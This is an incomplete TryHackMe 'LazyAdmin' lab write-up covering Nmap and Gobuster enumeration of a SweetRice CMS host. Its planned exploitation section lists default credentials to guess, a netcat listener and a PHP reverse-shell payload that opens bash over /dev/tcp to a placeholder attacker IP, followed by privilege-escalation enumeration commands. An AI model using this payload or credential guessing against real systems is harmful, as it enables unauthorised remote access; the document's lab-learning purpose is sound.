# LazyAdmin - TryHackMe Writeup

**Difficulty:** Easy  
**Status:** Enumeration Complete (Exploitation Incomplete - Technical Issues)  
**Date:** January 6-9, 2026

---

## Table of Contents
1. [Reconnaissance](#reconnaissance)
2. [Enumeration](#enumeration)
3. [Vulnerability Analysis](#vulnerability-analysis)
4. [Planned Exploitation Path](#planned-exploitation-path)
5. [Technical Blockers](#technical-blockers)
6. [Key Learnings](#key-learnings)

---

## Reconnaissance

### Initial Port Scan

Started with an aggressive Nmap scan to identify open ports and running services:

```bash
nmap -sV -sC -Pn -T5 <MACHINE_IP>
```

**Results:**

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-06 21:04 -03
Nmap scan report for 10.65.140.68
Host is up (0.12s latency).
Not shown: 972 closed tcp ports (conn-refused), 26 filtered tcp ports (no-response)

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)

80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Initial Findings

**Open Ports:**
- **Port 22** - SSH (OpenSSH 7.2p2)
- **Port 80** - HTTP (Apache 2.4.18)

**Web Server Analysis:**
- Default Apache2 Ubuntu page visible
- Apache version 2.4.18 (potentially outdated)
- Ubuntu-based system

---

## Enumeration

### Web Directory Discovery

Performed directory enumeration using Gobuster to discover hidden paths:

```bash
gobuster dir -u http://<MACHINE_IP> -w ~/Downloads/common.txt
```

**Initial Results:**

```
===============================================================
[+] Url:                     http://10.65.140.68
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                ~/Downloads/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================

/.htaccess            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/content              (Status: 200) [Size: 277]
/index.html           (Status: 200) [Size: 277]
/server-status        (Status: 403) [Size: 277]
```

**Key Discovery:** `/content` directory found - requires deeper investigation.

### Content Management System Identification

Inspected the `/content` directory source code and identified **SweetRice CMS** in use.

Retrieved version information from `/content/latest.txt`:
- **SweetRice Version: 1.5.1**

### Deep Enumeration of /content

Performed recursive directory scan on the `/content` path:

```bash
gobuster dir -u http://<MACHINE_IP>/content -w /usr/share/wordlists/dirb/common.txt
```

**Critical Findings:**

```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/_themes              (Status: 301) [--> http://10.65.140.68/content/_themes/]
/as                   (Status: 301) [--> http://10.65.140.68/content/as/]
/attachment           (Status: 301) [--> http://10.65.140.68/content/attachment/]
/images               (Status: 301) [--> http://10.65.140.68/content/images/]
/inc                  (Status: 301) [--> http://10.65.140.68/content/inc/]
/index.php            (Status: 200) [Size: 2198]
/js                   (Status: 301) [--> http://10.65.140.68/content/js/]
===============================================================
```

### Directory Analysis

**High-Value Targets Identified:**

| Directory | Purpose | Security Impact |
|-----------|---------|----------------|
| `/as` | Admin panel with login form | Potential credential brute-force target |
| `/inc` | Include files and configurations | May contain sensitive data/backups |
| `/attachment` | File upload directory | Potential arbitrary file upload |
| `/_themes` | Theme files with PHP code | Possible code execution vector |

### Theme Directory Structure

Explored `/content/_themes/default/` and found multiple PHP files:

```
Index of /content/_themes/default
[ICO]        Name                Last modified       Size
[PARENTDIR]  Parent Directory                        -
[ ]          cat.php             2016-09-19 17:55    1.6K
[ ]          comment_form.php    2016-09-19 17:55    3.5K
[DIR]        css/                2016-09-19 17:57    -
[ ]          entry.php           2016-09-19 17:55    3.4K
[ ]          foot.php            2016-09-19 17:55    1.6K
[ ]          form.php            2016-09-19 17:55    680
[ ]          head.php            2016-09-19 17:55    1.8K
[ ]          main.php            2016-09-19 17:55    1.1K
[ ]          show_comment.php    2016-09-19 17:55    1.7K
[ ]          sidebar.php         2016-09-19 17:55    2.3K
[ ]          sitemap.php         2016-09-19 17:55    1.5K
[ ]          tags.php            2016-09-19 17:55    1.3K
[ ]          theme.config        2016-09-19 17:55    204
```

**Note:** Individual PHP files did not execute directly when accessed, suggesting they require the CMS framework to function.

---

## Vulnerability Analysis

### Context Assessment

**Lab Name Analysis:** "LazyAdmin" suggests:
- Poor security practices
- Default/weak credentials likely
- Misconfiguration as primary vector
- Manual exploitation path (not automated)

### SweetRice CMS 1.5.1 - Known Vulnerabilities

Research indicates SweetRice 1.5.1 has documented security issues:

**Potential Attack Vectors:**

1. **Backup Disclosure Vulnerability**
   - Database backups may be accessible in `/inc/mysql_backup/`
   - Could contain plaintext credentials

2. **Arbitrary File Upload**
   - CMS allows file uploads through admin panel
   - Potential for PHP shell upload and execution

3. **Cross-Site Request Forgery (CSRF)**
   - Admin functions vulnerable to CSRF attacks

4. **Weak Authentication**
   - Given "LazyAdmin" context, default or simple passwords probable

### Attack Surface Summary

```
Entry Points:
├── Admin Panel (/content/as/)
│   ├── Credential brute-force
│   └── Default password attempt
│
├── Configuration Files (/content/inc/)
│   ├── mysql_backup/ exploration
│   └── Credential extraction
│
└── File Upload Mechanism
    └── PHP reverse shell injection
```

---

## Planned Exploitation Path

### Phase 1: Credential Discovery

**Approach A - Backup File Analysis:**
```bash
# Navigate to potential backup location
curl http://<MACHINE_IP>/content/inc/mysql_backup/

# Download and analyze any SQL dumps found
# Extract username and password hash
# Attempt hash cracking with tools like hashcat or john
```

**Approach B - Weak Credential Testing:**
```
Test common credentials on /content/as/:
- admin:admin
- admin:password
- admin:Password123
- manager:manager
- admin:lazy
```

### Phase 2: Initial Access

**Method A - Admin Panel Login:**
1. Authenticate using discovered credentials
2. Navigate to file upload functionality
3. Upload PHP reverse shell (e.g., pentestmonkey shell)
4. Access uploaded file to trigger shell

**Method B - Direct Exploitation:**
```bash
# If known exploit exists for SweetRice 1.5.1
searchsploit sweetrice 1.5.1
# Use Metasploit or manual exploit
```

### Phase 3: Reverse Shell Establishment

**Preparation:**
```bash
# On attacker machine (Kali/attacking box)
# Set up netcat listener
nc -lvnp 4444

# Note: Use VPN IP from tun0 interface
ip a show tun0  # Get your TryHackMe VPN IP
```

**Payload Example:**
```php
<?php
system("bash -c 'bash -i >& /dev/tcp/<YOUR_VPN_IP>/4444 0>&1'");
?>
```

### Phase 4: Privilege Escalation

**Enumeration Commands:**
```bash
# System information
uname -a
cat /etc/issue

# User privileges
sudo -l
id

# SUID binaries
find / -perm -4000 2>/dev/null

# Scheduled tasks
cat /etc/crontab
ls -la /etc/cron*

# Writable directories
find / -writable -type d 2>/dev/null
```

---

## Technical Blockers

### VPN Connectivity Issues

**Problem Description:**
Multiple VPN tunnel interfaces (`tun0`, `tun1`, `tun2`) were created with identical IP addresses, causing routing conflicts and preventing reliable connection to the target machine.

**Symptoms:**
- TryHackMe web interface showed "disconnected" status despite active OpenVPN process
- Network tools (ping, curl, netcat) failed to establish connections
- Multiple simultaneous tunnel interfaces detected

**Attempted Solutions:**
1. Verified OpenVPN connection via terminal
2. Confirmed VPN interface IP assignment
3. Attempted to kill and restart VPN connection
4. Tested connectivity with ping and web requests

**Impact:**
- Unable to complete practical exploitation phase
- Reverse shell connection could not be established
- Flag capture impossible without network connectivity

### Technical Environment Details

```
System: Arch Linux
VPN IP: 192.168.135.187/17
Interface: tun0, tun1, tun2 (duplicate interfaces)
Target IP: 10.65.140.68
```

---

## Key Learnings

### Penetration Testing Methodology

1. **Enumeration is the Foundation**
   - "Exploit is consequence. Enumeration is cause."
   - Always perform recursive directory scanning
   - Context matters: lab name often hints at vulnerability class

2. **Apache ≠ Vulnerability**
   - Web server version alone doesn't indicate weakness
   - Focus on applications running ON the server (CMS, frameworks)
   - SweetRice CMS was the actual attack surface, not Apache

3. **Documentation Best Practices**
   - Record every command and output
   - Note thought process and decision points
   - Document blockers honestly for future reference

### Technical Skills Developed

- Nmap service enumeration
- Gobuster directory discovery
- CMS identification and version detection
- Vulnerability research workflow
- Attack path planning and documentation

### Areas for Improvement

- VPN troubleshooting and network diagnostics
- Alternative exploitation methods when primary path blocked
- Setting up proper lab environment (VM isolation)
- Backup connectivity options (alternative machines/networks)

---

## Conclusion

**Completion Status:** Enumeration phase completed successfully. Exploitation phase planned but not executed due to technical limitations.

**Skills Demonstrated:**
- Systematic reconnaissance methodology
- Comprehensive enumeration techniques
- Vulnerability identification and research
- Attack path planning and documentation

**Next Steps:**
- Resolve VPN connectivity issues
- Return to complete exploitation phase
- Document full privilege escalation path
- Capture user and root flags

---

## References

- [TryHackMe - LazyAdmin Room](https://tryhackme.com/room/lazyadmin)
- [SweetRice CMS Official Site](http://www.basic-cms.org/)
- [Exploit-DB - SweetRice Vulnerabilities](https://www.exploit-db.com/)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [Gobuster Documentation](https://github.com/OJ/gobuster)

---

**Author Notes:** This writeup represents honest documentation of a penetration testing attempt that encountered technical obstacles. In professional engagements, such transparency is crucial for client understanding and future remediation planning.
